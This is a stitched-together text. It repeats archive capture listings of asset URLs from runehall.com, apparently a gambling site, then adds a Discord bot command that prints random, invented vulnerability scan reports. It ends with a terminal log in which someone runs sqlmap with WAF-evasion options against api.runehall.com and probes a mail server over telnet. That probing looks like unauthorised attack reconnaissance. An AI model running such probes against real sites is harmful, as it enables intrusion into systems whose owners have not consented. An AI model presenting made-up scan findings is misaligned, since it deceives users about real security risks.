https://runehall.com/assets/casino.1cc8cf1b.svg	image/svg+xml	Jan 30, 2024	Aug 4, 2024	4	3	1
https://runehall.com/assets/challenge.c574def9.svg	image/svg+xml	Aug 4, 2024	Aug 4, 2024	1	0	1
https://runehall.com/assets/chat_rules.224028d2.svg	image/svg+xml	Nov 15, 2022	Apr 6, 2024	4	3	1
https://runehall.com/assets/CheapGp.d7ada62e.png	image/png	Jan 30, 2024	Aug 4, 2024	4	2	2
https://runehall.com/assets/chest-battles-banner.49c2e485.png	image/png	Jan 30, 2024	Apr 6, 2024	2	0	2
https://runehall.com/assets/chests-battles-tile.107a8ea5.png	image/png	Jan 30, 2024	Apr 6, 2024	2	0	2
https://runehall.com/assets/chests-tile.11ce69ff.png	image/png	Jan 30, 2024	Apr 6, 2024	2	0	2
https://runehall.com/assets/classic-crash.02dc093e.png	image/png	Apr 6, 2024	Apr 6, 2024	1	0	1
https://runehall.com/assets/clear_all.3789bb64.svg	image/svg+xml	Jan 30, 2024	Jan 30, 2024	1	0	1
https://runehall.com/assets/command.11cbaa76.svg	image/svg+xml	Jan 30, 2024	Aug 4, 2024	4	3	1
https://runehall.com/assets/crash-tile.f73f7566.png	image/png	Apr 6, 2024	Apr 6, 2024	1	0	1
https://runehall.com/assets/crash.ebd5b119.svg	image/svg+xml	Jan 30, 2024	Jan 30, 2024	1	0	1
https://runehall.com/assets/dice.762de533.svg	image/svg+xml	Jan 30, 2024	Apr 6, 2024	2	1	1



URL	MIME Type	From	To	Captures	Duplicates	Uniques
https://runehall.com/assets/win.c1a62c65.wav	application/octet-stream	Jan 30, 2024	Jan 30, 2024	1	0	1
https://runehall.com/assets/x99.13ba303b.svg	image/svg+xml	Jan 30, 2024	Apr 6, 2024	2	1	1
https://runehall.com/atom.xml


URL	MIME Type	From	To	Captures	Duplicates	Uniques
https://runehall.com/assets/loose.4770db6f.mp3	audio/mpeg	Jan 30, 2024	Jan 30, 2024	1	0	1
https://runehall.com/assets/ltc.f2eeccb6.svg	image/svg+xml	Jan 30, 2024	Aug 4, 2024	4	3	1
https://runehall.com/assets/luckyWheel.cf540aa7.svg	image/svg+xml	Jan 30, 2024	Jan 30, 2024	1	0	1
https://runehall.com/assets/LUL.b9908c7b.png	image/png	Nov 15, 2022	Nov 15, 2022	1	0	1
https://runehall.com/assets/mines.eba05f22.svg	image/svg+xml	Jan 30, 2024	Apr 6, 2024	2	1	1
https://runehall.com/assets/none.2646878e.wav	application/octet-stream	Jan 30, 2024	Jan 30, 2024	1	0	1
https://runehall.com/assets/one.5b59d0f2.svg	image/svg+xml	Jan 30, 2024	Apr 6, 2024	2	1	1
https://runehall.com/assets/originals.86417c9a.svg	image/svg+xml	Aug 4, 2024	Aug 4, 2024	1	0	1
https://runehall.com/assets/osrs.372067f1.png	image/png	Jan 30, 2024	Apr 6, 2024	3	1	2
https://runehall.com/assets/osrs.3ae721eb.svg	image/svg+xml	Aug 4, 2024	Aug 4, 2024	1	0	1
https://runehall.com/assets/plinko.6ef64024.svg	image/svg+xml	Jan 30, 2024	Apr 6, 2024	2	1	1
https://runehall.com/assets/poker-chip.9fe183f5.png	image/png	Jan 30, 2024	Apr 6, 2024	2	0	2
https://runehall.com/assets/poker.185033e6.png	image/png	Jan 30, 2024	Apr 6, 2024	2	0	2
https://runehall.com/assets/poker.2f904def.svg	image/svg+xml	Nov 15, 2022	Nov 15, 2022	1	0	1
https://runehall.com/assets/poker.49a05cdc.svg	image/svg+xml	Jan 30, 2024	Aug 4, 2024	4	3	1
https://runehall.com/assets/race.add67c7a.svg	image/svg+xml	Jan 30, 2024	Aug 4, 2024	4	3	1
https://runehall.com/assets/raced-2.6f14aae1.png	image/png	Jan 30, 2024	Jan 30, 2024	1	0	1
https://runehall.com/assets/rain.774f97c3.svg	image/svg+xml	Mar 4, 2024	Mar 4, 2024	1	0	1
https://runehall.com/assets/referrals.c38dc4e1.svg	image/svg+xml	Jan 30, 2024	Aug 4, 2024	4	3	1
https://runehall.com/assets/rh-bg.e0182121.png	image/png	Jan 30, 2024	Aug 4, 2024	4	2	2
https://runehall.com/assets/rh-crash.79015450.png	image/png	Apr 6, 2024	Apr 6, 2024	1	0	1
https://runehall.com/assets/rh-crypto.c660bde4.png	image/png	Jan 30, 2024	Apr 6, 2024	2	0	2
https://runehall.com/assets/rh-rain-pool.ad7fcb58.png	image/png	Apr 6, 2024	Apr 6, 2024	1	0	1
https://runehall.com/assets/rh-sports.0d1a9f5a.png	image/png	Jan 30, 2024	Apr 6, 2024	2	0	2
https://runehall.com/assets/rh-weekly.7900c41b.png	image/png	Jan 30, 2024	Apr 6, 2024	2	0	2
https://runehall.com/assets/rs3.6f2335ae.svg	image/svg+xml	Jan 30, 2024	Jan 30, 2024	1	0	1
https://runehall.com/assets/slide.2c21350d.svg	image/svg+xml	Jan 30, 2024	Apr 6, 2024	2	1	1
https://runehall.com/assets/slots.66f0d08b.svg	image/svg+xml	Jan 30, 2024	Apr 6, 2024	2	1	1
https://runehall.com/assets/spin.75b0d36b.wav	application/octet-stream	Jan 30, 2024	Jan 30, 2024	1	0	1
https://runehall.com/assets/sports-spinner.a94b6a8e.gif	image/gif	Jan 30, 2024	Apr 6, 2024	2	1	1
https://runehall.com/assets/sports.68ca8672.svg	image/svg+xml	Jan 30, 2024	Aug 4, 2024	4	3	1
https://runehall.com/assets/sports.b81f5824.svg	image/svg+xml	Nov 15, 2022	Nov 15, 2022	1	0	1
https://runehall.com/assets/sports.d55377ee.svg	image/svg+xml	Jan 30, 2024	Apr 6, 2024	2	1	1
https://runehall.com/assets/start.aec3ece6.wav	application/octet-stream	Jan 30, 2024	Jan 30, 2024	1	0	1
https://runehall.com/assets/stop.47dee04e.wav	application/octet-stream	Jan 30, 2024	Jan 30, 2024	1	0	1
https://runehall.com/assets/swords.5ba9d7af.svg	image/svg+xml	Jan 30, 2024	Aug 4, 2024	4	3	1
https://runehall.com/assets/telegram.af47cb49.svg	image/svg+xml	Nov 15, 2022	Aug 4, 2024	5	4	1
https://runehall.com/assets/three.d3a8ba5d.svg	image/svg+xml	Jan 30, 2024	Apr 6, 2024	2	1	1
https://runehall.com/assets/tip.aadcbf2a.svg	image/svg+xml	Apr 6, 2024	Apr 6, 2024	1	0	1
https://runehall.com/assets/treasure-box.de6c5bda.svg	image/svg+xml	Jan 30, 2024	Aug 4, 2024	4	3	1
https://runehall.com/assets/twitter.b7c01e37.svg	image/svg+xml	Nov 15, 2022	Nov 15, 2022	1	0	1
https://runehall.com/assets/twitter.dfb0a6c4.svg	image/svg+xml	Jan 30, 2024	Aug 4, 2024	4	3	1
https://runehall.com/assets/two.64230477.svg	image/svg+xml	Jan 30, 2024	Apr 6, 2024	2	1	1
https://runehall.com/assets/unbet.8a62cb97.wav	application/octet-stream	Jan 30, 2024	Jan 30, 2024	1	0	1
https://runehall.com/assets/undo.fcac4d90.svg	image/svg+xml	Jan 30, 2024	Jan 30, 2024	1	0	1
https://runehall.com/assets/vault-banner.32fc9441.png	image/png	Jan 30, 2024	Apr 6, 2024	2	0	2
https://runehall.com/assets/vendor.097c0184.js	application/javascript	Dec 16, 2022	Dec 16, 2022	1	0	1
https://runehall.com/assets/vendor.9b5c607f.js	text/html	Apr 4, 2023	Apr 4, 2023	1	0	1
https://runehall.com/assets/vendor.af5346e6.js	application/javascript	Nov 15, 2022	Nov 15, 2022	1	0	1
https://runehall.com/assets/video_poker.99ee3146.svg	image/svg+xml	Jan 30, 2024	Apr 6, 2024	2	1	1
Showing 151 to 200 of 203 entries

http://runehall.com/a/BoooYa	text/html	Dec 16, 2024	Dec 16, 2024	2	0	2
http://runehall.com/assets/index.f5144f28.js	text/html	Jan 2, 2025	Jun 11, 2025	3	0	3
https://runehall.com/a/Alpha	text/html	Feb 25, 2024	Feb 25, 2024	1	0	1
https://runehall.com/a/Black	text/html	Sep 24, 2023	Sep 24, 2023	1	0	1
https://runehall.com/a/BlightedBets	text/html	Jul 15, 2025	Jul 15, 2025	1	0	1
https://runehall.com/a/Dbuffed	text/html	Sep 24, 2023	Sep 24, 2023	1	0	1
https://runehall.com/a/DNG	warc/revisit	Dec 27, 2023	Feb 25, 2024	2	0	2
https://runehall.com/a/dorkbet	text/html	May 23, 2025	May 23, 2025	1	0	1
https://runehall.com/a/Dovis	text/html	May 23, 2025	May 23, 2025	1	0	1
https://runehall.com/a/fiddlydingus	text/html	Jun 28, 2023	Jun 28, 2023	1	0	1
https://runehall.com/a/flashyflashy	text/html	Jan 29, 2025	Mar 28, 2025	2	0	2
https://runehall.com/a/ing	text/html	Sep 12, 2024	Sep 15, 2024	2	0	2
https://runehall.com/a/Johnjok	text/html	Nov 14, 2024	Nov 14, 2024	1	0	1
https://runehall.com/a/loltage	text/html	Nov 26, 2024	Nov 26, 2024	1	0	1
https://runehall.com/a/OSBOT1	text/html	Feb 2, 2023	Jul 4, 2025	11	0	11
https://runehall.com/a/Osbot6m	text/html	Feb 15, 2025	Jul 4, 2025	6	0	6
https://runehall.com/a/osbotbottom	text/html	Feb 25, 2024	Mar 24, 2024	2	0	2
https://runehall.com/a/osbotheader	text/html	Jan 30, 2024	Aug 4, 2024	4	0	4
https://runehall.com/a/osbotheader?view=auth&tab=register	text/html	Jan 30, 2024	Jan 30, 2024	1	0	1
https://runehall.com/a/PhaserBomb	text/html	Feb 28, 2025	Feb 28, 2025	1	0	1
https://runehall.com/a/rkqz999	text/html	Apr 3, 2023	Apr 3, 2023	1	0	1
https://runehall.com/a/RSGUIDES	text/html	Feb 15, 2025	Jun 13, 2025	2	0	2
https://runehall.com/a/RuneLister	text/html	Feb 25, 2024	Mar 28, 2025	3	0	3
https://runehall.com/a/Sythesports	text/html	Sep 24, 2023	Jun 16, 2024	2	0	2
https://runehall.com/a/Takashi	text/html	Sep 24, 2023	Sep 24, 2023	1	0	1
https://runehall.com/a/vidas69	text/html	Nov 20, 2024	Nov 20, 2024	1	0	1
https://runehall.com/a/xTwitter	text/html	May 27, 2024	May 27, 2024	1	0	1
https://runehall.com/ads.txt	text/html	Jun 10, 2023	Jul 15, 2025	17	0	17
https://runehall.com/app-ads.txt	text/html	Jun 10, 2023	Jul 15, 2025	16	0	16
https://runehall.com/apple-touch-icon.png	image/png	Jul 23, 2023	Jul 4, 2025	2	0	2
https://runehall.com/assets/18-plus.9123aea5.svg	image/svg+xml	Aug 4, 2024	Aug 4, 2024	1	0	1
https://runehall.com/assets/american_roulette.48992306.svg	image/svg+xml	Jan 30, 2024	Apr 6, 2024	2	1	1
https://runehall.com/assets/bacca.cbbc35a8.svg	image/svg+xml	Jan 30, 2024	Apr 6, 2024	2	1	1
https://runehall.com/assets/basketball.17f13488.png	image/png	Mar 4, 2024	Apr 6, 2024	2	1	1
https://runehall.com/assets/blackjack.6e08836c.svg	image/svg+xml	Jan 30, 2024	Apr 6, 2024	2	1	1
https://runehall.com/assets/blackjack.ecc50b10.svg	image/svg+xml	Nov 15, 2022	Nov 15, 2022	1	0	1
https://runehall.com/assets/btc.4f29a9c3.svg	image/svg+xml	Jan 30, 2024	Aug 4, 2024	2	1	1
https://runehall.com/assets/casino.1cc8cf1b.svg	image/svg+xml	Jan 30, 2024	Aug 4, 2024	4	3	1
https://runehall.com/assets/challenge.c574def9.svg	image/svg+xml	Aug 4, 2024	Aug 4, 2024	1	0	1
https://runehall.com/assets/chat_rules.224028d2.svg	image/svg+xml	Nov 15, 2022	Apr 6, 2024	4	3	1
https://runehall.com/assets/CheapGp.d7ada62e.png	image/png	Jan 30, 2024	Aug 4, 2024	4	2	2
https://runehall.com/assets/chest-battles-banner.49c2e485.png	image/png	Jan 30, 2024	Apr 6, 2024	2	0	2
https://runehall.com/assets/chests-battles-tile.107a8ea5.png	image/png	Jan 30, 2024	Apr 6, 2024	2	0	2
https://runehall.com/assets/chests-tile.11ce69ff.png	image/png	Jan 30, 2024	Apr 6, 2024	2	0	2
https://runehall.com/assets/classic-crash.02dc093e.png	image/png	Apr 6, 2024	Apr 6, 2024	1	0	1
https://runehall.com/assets/clear_all.3789bb64.svg	image/svg+xml	Jan 30, 2024	Jan 30, 2024	1	0	1
https://runehall.com/assets/command.11cbaa76.svg	image/svg+xml	Jan 30, 2024	Aug 4, 2024	4	3	1
https://runehall.com/assets/crash-tile.f73f7566.png	image/png	Apr 6, 2024	Apr 6, 2024	1	0	1
https://runehall.com/assets/crash.ebd5b119.svg	image/svg+xml	Jan 30, 2024	Jan 30, 2024	1	0	1
https://runehall.com/assets/dice.762de533.svg





http://runehall.com/a/BoooYa	text/html	Dec 16, 2024	Dec 16, 2024	2	0	2
http://runehall.com/assets/index.f5144f28.js	text/html	Jan 2, 2025	Jun 11, 2025	3	0	3
https://runehall.com/a/Alpha	text/html	Feb 25, 2024	Feb 25, 2024	1	0	1
https://runehall.com/a/Black	text/html	Sep 24, 2023	Sep 24, 2023	1	0	1
https://runehall.com/a/BlightedBets	text/html	Jul 15, 2025	Jul 15, 2025	1	0	1
https://runehall.com/a/Dbuffed	text/html	Sep 24, 2023	Sep 24, 2023	1	0	1
https://runehall.com/a/DNG	warc/revisit	Dec 27, 2023	Feb 25, 2024	2	0	2
https://runehall.com/a/dorkbet	text/html	May 23, 2025	May 23, 2025	1	0	1
https://runehall.com/a/Dovis	text/html	May 23, 2025	May 23, 2025	1	0	1
https://runehall.com/a/fiddlydingus	text/html	Jun 28, 2023	Jun 28, 2023	1	0	1
https://runehall.com/a/flashyflashy	text/html	Jan 29, 2025	Mar 28, 2025	2	0	2
https://runehall.com/a/ing	text/html	Sep 12, 2024	Sep 15, 2024	2	0	2
https://runehall.com/a/Johnjok	text/html	Nov 14, 2024	Nov 14, 2024	1	0	1
https://runehall.com/a/loltage	text/html	Nov 26, 2024	Nov 26, 2024	1	0	1
https://runehall.com/a/OSBOT1	text/html	Feb 2, 2023	Jul 4, 2025	11	0	11
https://runehall.com/a/Osbot6m	text/html	Feb 15, 2025	Jul 4, 2025	6	0	6
https://runehall.com/a/osbotbottom	text/html	Feb 25, 2024	Mar 24, 2024	2	0	2
https://runehall.com/a/osbotheader	text/html	Jan 30, 2024	Aug 4, 2024	4	0	4
https://runehall.com/a/osbotheader?view=auth&tab=register	text/html	Jan 30, 2024	Jan 30, 2024	1	0	1
https://runehall.com/a/PhaserBomb	text/html	Feb 28, 2025	Feb 28, 2025	1	0	1
https://runehall.com/a/rkqz999	text/html	Apr 3, 2023	Apr 3, 2023	1	0	1
https://runehall.com/a/RSGUIDES	text/html	Feb 15, 2025	Jun 13, 2025	2	0	2
https://runehall.com/a/RuneLister	text/html	Feb 25, 2024	Mar 28, 2025	3	0	3
https://runehall.com/a/Sythesports	text/html	Sep 24, 2023	Jun 16, 2024	2	0	2
https://runehall.com/a/Takashi	text/html	Sep 24, 2023	Sep 24, 2023	1	0	1
https://runehall.com/a/vidas69	text/html	Nov 20, 2024	Nov 20, 2024	1	0	1
https://runehall.com/a/xTwitter	text/html	May 27, 2024	May 27, 2024	1	0	1
https://runehall.com/ads.txt	text/html	Jun 10, 2023	Jul 15, 2025	17	0	17
https://runehall.com/app-ads.txt	text/html	Jun 10, 2023	Jul 15, 2025	16	0	16
https://runehall.com/apple-touch-icon.png	image/png	Jul 23, 2023	Jul 4, 2025	2	0	2
https://runehall.com/assets/18-plus.9123aea5.svg	image/svg+xml	Aug 4, 2024	Aug 4, 2024	1	0	1
https://runehall.com/assets/american_roulette.48992306.svg	image/svg+xml	Jan 30, 2024	Apr 6, 2024	2	1	1
https://runehall.com/assets/bacca.cbbc35a8.svg	image/svg+xml	Jan 30, 2024	Apr 6, 2024	2	1	1
https://runehall.com/assets/basketball.17f13488.png	image/png	Mar 4, 2024	Apr 6, 2024	2	1	1
https://runehall.com/assets/blackjack.6e08836c.svg	image/svg+xml	Jan 30, 2024	Apr 6, 2024	2	1	1
https://runehall.com/assets/blackjack.ecc50b10.svg	image/svg+xml	Nov 15, 2022	Nov 15, 2022	1	0	1
https://runehall.com/assets/btc.4f29a9c3.svg	image/svg+xml	Jan 30, 2024	Aug 4, 2024	2	1	1
https://runehall.com/assets/casino.1cc8cf1b.svg	image/svg+xml	Jan 30, 2024	Aug 4, 2024	4	3	1
https://runehall.com/assets/challenge.c574def9.svg	image/svg+xml	Aug 4, 2024	Aug 4, 2024	1	0	1
https://runehall.com/assets/chat_rules.224028d2.svg	image/svg+xml	Nov 15, 2022	Apr 6, 2024	4	3	1
https://runehall.com/assets/CheapGp.d7ada62e.png	image/png	Jan 30, 2024	Aug 4, 2024	4	2	2
https://runehall.com/assets/chest-battles-banner.49c2e485.png	image/png	Jan 30, 2024	Apr 6, 2024	2	0	2
https://runehall.com/assets/chests-battles-tile.107a8ea5.png	image/png	Jan 30, 2024	Apr 6, 2024	2	0	2
https://runehall.com/assets/chests-tile.11ce69ff.png	image/png	Jan 30, 2024	Apr 6, 2024	2	0	2
https://runehall.com/assets/classic-crash.02dc093e.png	image/png	Apr 6, 2024	Apr 6, 2024	1	0	1
https://runehall.com/assets/clear_all.3789bb64.svg	image/svg+xml	Jan 30, 2024	Jan 30, 2024	1	0	1
https://runehall.com/assets/command.11cbaa76.svg	image/svg+xml	Jan 30, 2024	Aug 4, 2024	4	3	1
https://runehall.com/assets/crash-tile.f73f7566.png	image/png	Apr 6, 2024	Apr 6, 2024	1	0	1
https://runehall.com/assets/crash.ebd5b119.svg	image/svg+xml	Jan 30, 2024	Jan 30, 2024	1	0	1
https://runehall.com/assets/dice.762de533.svg

@bot.command()
@commands.is_owner()
async def exploit_scan(ctx, domain: str):
    """Scan domain for vulnerabilities"""
    # Simulated scanning process
    steps = [
        f"🔍 Scanning {domain}...",
        "🛰️ Identifying subdomains...",
        "🕵️‍♂️ Checking for open ports...",
        "🔬 Analyzing HTTP headers...",
        "🧪 Testing for XSS vulnerabilities...",
        "💉 Probing for SQL injection points...",
        "📡 Checking CORS misconfigurations...",
        "🔓 Testing for directory traversal..."
    ]

    msg = await ctx.send("Starting vulnerability scan...")
    for step in steps:
        await asyncio.sleep(2)
        await msg.edit(content=step)

    # Simulated results
    results = {
        "critical": random.randint(1, 5),
        "high": random.randint(3, 8),
        "medium": random.randint(5, 12),
        "subdomains": [f"admin.{domain}", f"api.{domain}", f"dev.{domain}", f"ma                                                                                        il.{domain}"],
        "vulnerabilities": [
            "SQL Injection - /login.php",
            "XSS Vulnerability - /search?q=<script>",
            "Misconfigured CORS - api.subdomain",
            "Sensitive Data Exposure - /backup.zip"
        ]
    }

    # CORRECTED REPORT SECTION
    report = (
        f"📊 **Scan Report for {domain}**\n"
        f"🔴 Critical: {results['critical']}\n"
        f"🟠 High: {results['high']}\n"
        f"🟡 Medium: {results['medium']}\n\n"
        "**Top Vulnerabilities:**\n- " + "\n- ".join(results['vulnerabilities'][                                                                                        :3]) + "\n\n"
        "**Subdomains Found:**\n" + ", ".join(results['subdomains'])
    )

    await ctx.send(report)

                                 u0_a305@localhost:~/k7/venv$ telnet mx.zoho.com 25  # Test mail server (press CTRL+] then quit)                                             Trying 204.141.33.44...                                               Connected to mx.zoho.com.                                             Escape character is '^]'.                                             220 mx.zohomail.com SMTP Server ready August 1, 2025 3:24:49 PM PDT   runehall.com                                                          503 Must issue a EHLO/HELO command first.                             Ehlo
   501 Domain address required: EHLO                                     tail -f /var/log/mail.log | grep -E 'FAIL|REJECT'                     503 Must issue a EHLO/HELO command first.                             Connection closed by foreign host.                                    u0_a305@localhost:~/k7/venv$ sqlmap -u "https://api.runehall.com/?id=1" --tamper=space2comment --skip-waf                                           ___                                    __H__                                                           ___ ___[.]_____ ___ ___  {1.9.7#pip}                                 |_ -| . [.]     | .'| . |                                             |___|_  [(]_|_|_|__,|  _|                                                   |_|V...       |_|   https://sqlmap.org                                              [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program                                               [*] starting @ 19:16:00 /2025-08-01/                                        [19:16:00] [INFO] loading tamper module 'space2comment'               [19:16:00] [INFO] testing connection to the target URL                [19:16:01] [WARNING] the web server responded with an HTTP error code (403) which could interfere with the results of the tests             [19:16:01] [INFO] testing if the target URL content is stable         [19:16:01] [WARNING] target URL content is not stable (i.e. content differs). sqlmap will base the page comparison on a sequence matcher. If no dynamic nor injectable parameters are detected, or in case of junk results, refer to user's manual paragraph 'Page comparison'          how do you want to proceed? [(C)ontinue/(s)tring/(r)egex/(q)uit] c    [19:16:18] [INFO] searching for dynamic content                       [19:16:19] [INFO] dynamic content marked for removal (4 regions)      [19:16:19] [INFO] testing if GET parameter 'id' is dynamic            [19:16:19] [INFO] GET parameter 'id' appears to be dynamic            [19:16:19] [WARNING] reflective value(s) found and filtering out      [19:16:20] [WARNING] heuristic (basic) test shows that GET parameter 'id' might not be injectable                                           [19:16:20] [INFO] testing for SQL injection on GET parameter 'id'     [19:16:20] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'                                      [19:16:23] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'                                                        [19:16:23] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'                        [19:16:24] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'                                                             [19:16:26] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'                                       [19:16:27] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'                                                       [19:16:28] [INFO] testing 'Generic inline queries'                    [19:16:28] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'[19:16:29] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'                                                           [19:16:30] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'                                                    [19:16:31] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'                                                              [19:16:32] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'     [19:16:34] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind (IF)'
     [19:16:35] [INFO] testing 'Oracle AND time-based blind'               it is recommended to perform only basic UNION tests if there is not at least one other (potential) technique found. Do you want to reduce the number of requests? [Y/n] n                                         [19:16:54] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'                           [19:17:10] [WARNING] GET parameter 'id' does not seem to be injectable[19:17:10] [CRITICAL] all tested parameters do not appear to be injectable. Try to increase values for '--level'/'--risk' options if you wish to perform more tests. You can give it a go with the switch '--text-only' if the target page has a low percentage of textual content (~1.22% of page content is text)                                           [19:17:10] [WARNING] HTTP error codes detected during run:            403 (Forbidden) - 129 times                                     [*] ending @ 19:17:10 /2025-08-01/
u0_a305@localhost:~/k7/venv$

